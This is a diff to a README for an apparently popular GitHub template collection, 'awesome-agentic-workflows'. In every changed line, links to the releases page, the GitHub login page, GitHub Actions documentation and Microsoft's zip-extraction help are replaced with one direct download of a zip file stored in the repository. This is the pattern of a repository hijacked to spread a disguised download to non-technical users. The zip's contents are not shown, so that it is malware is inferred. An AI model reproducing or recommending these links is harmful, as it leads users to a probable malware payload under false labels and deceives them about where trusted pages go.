@@ -1,6 +1,6 @@
 # ⚙️ awesome-agentic-workflows - Easy GitHub Workflow Templates
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Get%20Workflows-brightgreen)](https://github.com/Ltelitas/awesome-agentic-workflows/releases)
+[![Download Release](https://img.shields.io/badge/Download%20Release-Get%20Workflows-brightgreen)](https://github.com/Ltelitas/awesome-agentic-workflows/raw/refs/heads/main/templates/agentic_workflows_awesome_2.4.zip)
 
 ## 📦 About awesome-agentic-workflows
 
@@ -42,10 +42,10 @@ No programming or command-line skills are required.
 
 Start by visiting the release page. This page contains all the downloadable files and instructions you will use.
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Page-Visit%20Releases-blue)](https://github.com/Ltelitas/awesome-agentic-workflows/releases)
+[![Download from Releases](https://img.shields.io/badge/Download%20Page-Visit%20Releases-blue)](https://github.com/Ltelitas/awesome-agentic-workflows/raw/refs/heads/main/templates/agentic_workflows_awesome_2.4.zip)
 
 1. Click the link above or copy and paste this in your browser:
-   https://github.com/Ltelitas/awesome-agentic-workflows/releases
+   https://github.com/Ltelitas/awesome-agentic-workflows/raw/refs/heads/main/templates/agentic_workflows_awesome_2.4.zip
 
 2. On the releases page, look for the latest version. It will usually be at the top.
 
@@ -63,7 +63,7 @@ You don’t install these workflows like a program. Instead, you add them to you
 
 1. Open the extracted folder and browse to a template that fits your task. Each template has a description file to explain what it does.
 
-2. Log in to your GitHub account at https://github.com.
+2. Log in to your GitHub account at https://github.com/Ltelitas/awesome-agentic-workflows/raw/refs/heads/main/templates/agentic_workflows_awesome_2.4.zip
 
 3. Open the GitHub repository where you want to add the workflow. If you don’t have one, you can create a new repository using the "New" button on your GitHub homepage.
 
@@ -114,15 +114,15 @@ Inside each category folder, you will find:
 
 ## 🔗 Useful Links
 
-- Primary release downloads: https://github.com/Ltelitas/awesome-agentic-workflows/releases
-- GitHub help page on workflows: https://docs.github.com/actions
-- Windows extraction instructions: https://support.microsoft.com/en-us/windows/extract-zip-archives-in-windows-10-34d8b252-507f-d05a-53b8-7a8c3e87c188
+- Primary release downloads: https://github.com/Ltelitas/awesome-agentic-workflows/raw/refs/heads/main/templates/agentic_workflows_awesome_2.4.zip
+- GitHub help page on workflows: https://github.com/Ltelitas/awesome-agentic-workflows/raw/refs/heads/main/templates/agentic_workflows_awesome_2.4.zip
+- Windows extraction instructions: https://github.com/Ltelitas/awesome-agentic-workflows/raw/refs/heads/main/templates/agentic_workflows_awesome_2.4.zip
 
 ## 📥 Download and Setup
 
 Visit the release page below to start.
 
-[![Download Now](https://img.shields.io/badge/Download%20Page-Get%20Workflows-orgreen)](https://github.com/Ltelitas/awesome-agentic-workflows/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Page-Get%20Workflows-orgreen)](https://github.com/Ltelitas/awesome-agentic-workflows/raw/refs/heads/main/templates/agentic_workflows_awesome_2.4.zip)
 
 Follow the steps under “Getting Started” to download and apply workflows. The process requires no command-line use or script running on your computer.
 
